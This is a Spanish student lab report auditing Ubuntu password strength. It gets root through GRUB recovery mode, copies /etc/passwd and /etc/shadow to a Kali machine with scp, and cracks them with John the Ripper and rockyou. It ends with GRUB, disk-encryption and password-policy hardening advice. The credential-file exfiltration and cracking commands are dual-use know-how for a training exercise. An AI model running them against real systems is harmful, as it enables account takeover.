# Auditoría de contraseñas en Linux con John the Ripper

**Actividad NF1AA3 — Cracking de contraseñas**

## 1. Objetivo

Auditar la seguridad de las contraseñas de los usuarios de un servidor Linux (Ubuntu Server), comprobando su robustez frente a ataques básicos, de diccionario y de fuerza bruta. El ataque se realiza en dos fases:

1. Conseguir acceso como **root** a la máquina víctima y exfiltrar `/etc/passwd` y `/etc/shadow`.
2. Descifrar las contraseñas desde **Kali Linux** usando **John the Ripper / Johnny**.

## 2. Escenario

- **Máquina víctima:** Ubuntu Server (`root@victim`)
- **Máquina atacante:** Kali Linux — IP `10.0.2.15`, usuario `kali`
- Ambas con la tarjeta de red en modo **Red NAT**, en la misma red, para que puedan comunicarse.

---

## 3. Fase 1 — Acceso root mediante el modo de recuperación de GRUB

Como se tiene acceso físico (consola) a la máquina, se aprovecha el gestor de arranque GRUB para entrar como root sin conocer la contraseña.

1. Reiniciar la VM. En el menú de GRUB aparecen varias entradas de Ubuntu.
2. Seleccionar una de las entradas de arranque (modo de recuperación / rescate) y arrancar con ella.
3. El sistema arranca en **modo rescate** y ofrece una shell de mantenimiento de root (`root@victim`) sin pedir contraseña.

![Acceso root en modo rescate](/img/1.png)

> **Nota de seguridad:** esto demuestra que, con acceso físico, la contraseña por sí sola no protege nada. El simple hecho de poder elegir una entrada de arranque da control total del sistema. Hacen falta capas adicionales (contraseña en GRUB, cifrado de disco, control de acceso físico).


---

## 4. Fase 2 — Red y exfiltración de los ficheros

En modo rescate la red no se levanta, por lo que `enp0s3` aparece sin IP (`NO-CARRIER`):

```bash
ip a
```

![Ubuntu sin red en modo rescate](imagenes/02-ubuntu-sin-red.png)

Para solucionarlo, se pone una contraseña conocida a root y se reinicia en modo normal, donde la red sí obtiene IP:

```bash
mount -o remount,rw /
passwd
systemctl reboot
```

Se obtiene la IP de la máquina Kali para saber a dónde enviar los ficheros:

```bash
ip a
```

![IP de la máquina Kali](/img/3.png)

Antes de transferir, en Kali hay que asegurarse de que el servicio SSH está activo:

```bash
sudo systemctl start ssh

sudo systemctl status ssh
```

Y desde la Ubuntu se transfieren los dos ficheros con `scp`:

```bash
scp /etc/passwd /etc/shadow kali@10.0.2.15:.
```

![Transferencia scp completada](imagenes/04-scp-ok.png)

---

## 5. Fase 3 — Cracking de contraseñas

En Kali se comprueba que el servicio SSH está activo y se combinan los dos ficheros en el formato estándar que entiende John:

```bash
unshadow passwd shadow > passwords-nomcognom
```

![SSH activo y unshadow](/img/5.png)

Se instalan John y Johnny y se descomprime el diccionario rockyou:

```bash
sudo apt install john johnny -y
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

![Instalación de John y Johnny](/img/Captura%20de%20pantalla%202026-10-13%20164623.png)


### 5.1. Ataques por terminal y problema de formatos mezclados

Se lanza el primer ataque y John descifra la contraseña del usuario `gru`:

```bash
john --single passwords-nomcognom
```

![John descifra gru](imagenes/07-john-gru.png)

Sin embargo, al seguir con los demás ataques, John solo cargaba **1 hash** y devolvía *"No password hashes left to crack"*:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt passwords-nomcognom
john --incremental=Digits --min-len=4 --max-len=8 passwords-nomcognom
```

![John solo carga un hash](imagenes/08-john-1hash.png)

El motivo es que el fichero tenía **formatos de hash mezclados**: el usuario `gru` usa `$6$` (SHA-512) y el resto usa `$y$` (yescrypt). Por defecto, John solo carga el primer tipo que detecta. Comprobamos lo descifrado hasta el momento:

```bash
john --show passwords-nomcognom
```

![john --show con gru](imagenes/09-john-show.png)

### 5.2. Cracking con Johnny (interfaz gráfica)

Para cargar **todos** los hashes a la vez, se usa **Johnny** forzando el formato `crypt`, que utiliza la librería del sistema y soporta yescrypt.

Se abre el fichero de contraseñas desde *Open password file*:


![Abrir fichero en Johnny](imagenes/10-johnny-abrir.png)

En la pestaña *Options* se selecciona el formato `crypt` y el modo **Wordlist** con el diccionario `rockyou`:

![Opciones de Johnny: format crypt y rockyou](imagenes/11-johnny-opciones.png)

Se aplican los tres ataques (básico, diccionario y fuerza bruta numérica) y se obtiene el resultado final:

![Resultados finales en Johnny](imagenes/12-johnny-resultados.png)

---

## 6. Resultados

Se descifraron **5 de 6 contraseñas de usuario (83%)**:

| Usuario | Contraseña | Método que la rompió | Por qué era débil |
|---------|------------|----------------------|-------------------|
| gru     | `gru`      | Básico (single)      | Igual al nombre de usuario |
| bob     | `password` | Diccionario (rockyou)| De las más usadas del mundo |
| kevin   | `123456`   | Diccionario (rockyou)| Numérica trivial, top de filtradas |
| stuart  | `P@ssw0rd` | Diccionario (rockyou)| Variante típica ya catalogada |
| herb    | `love2006` | Diccionario (rockyou)| Palabra + año, patrón común |
| scarlet | *(no obtenida)* | — | Resistió los 3 ataques: no está en rockyou ni es numérica de 4-8 |

Las cuentas del sistema (`sshd` y servicios) aparecen con `!` o `*`: están **bloqueadas**, no tienen contraseña de login, por lo que no son vulnerables.

El caso de `scarlet` demuestra, por contraste, cómo una contraseña robusta resiste todos los ataques aplicados.

---


## 7. Verificación

Se comprobó que las contraseñas obtenidas son válidas iniciando sesión con un usuario:

```bash
su - gru
```

![Verificación de login](imagenes/13-verificacion.png)

---

## 8. Medidas de mejora y política de contraseñas

### Fortificación del equipo (nivel lógico)

- Proteger el **GRUB con contraseña** para impedir el acceso por el modo de recuperación.
- **Cifrar el disco** (LUKS), de modo que los ficheros no se puedan leer aunque se acceda físicamente.
- Poner contraseña a la **BIOS/UEFI** y controlar el orden de arranque.
- Restringir el **acceso físico** a la máquina.
- Bloquear la cuenta tras varios intentos fallidos (`pam_faillock`).

### Política de contraseñas segura

- Longitud mínima de **12 caracteres**.
- Combinación de mayúsculas, minúsculas, números y símbolos.
- Prohibir palabras de diccionario, el nombre de usuario y datos personales.
- No reutilizar contraseñas ya filtradas (validar con `pam_pwquality`).
- Caducidad y renovación periódica.
- Uso de un **gestor de contraseñas**.
- Mantener un algoritmo de hashing fuerte (**yescrypt**, por defecto en las distros modernas).


---

## 9. (Extra) Proteger el GRUB con contraseña

Generar el hash de la contraseña:

```bash
grub-mkpasswd-pbkdf2
```

Copiar el hash (empieza por `grub.pbkdf2.sha512...`) y editar `/etc/grub.d/40_custom`:

```bash
sudo nano /etc/grub.d/40_custom
```

Añadir al final:

```
set superusers="admin"
password_pbkdf2 admin grub.pbkdf2.sha512.10000.XXXXXXXX...
```

Aplicar los cambios:

```bash
sudo update-grub
```

A partir de ahora, editar o arrancar entradas del GRUB pedirá usuario y contraseña, bloqueando el acceso por el modo de recuperación.

---


## 10. Conclusión

El ataque tuvo éxito en 5 de 6 cuentas por el uso de contraseñas débiles (iguales al usuario, numéricas o palabras comunes). Esto confirma la importancia de establecer una política de contraseñas robusta y de aplicar seguridad en varias capas, ya que proteger el sistema solo con contraseña no es suficiente frente a un atacante con acceso físico.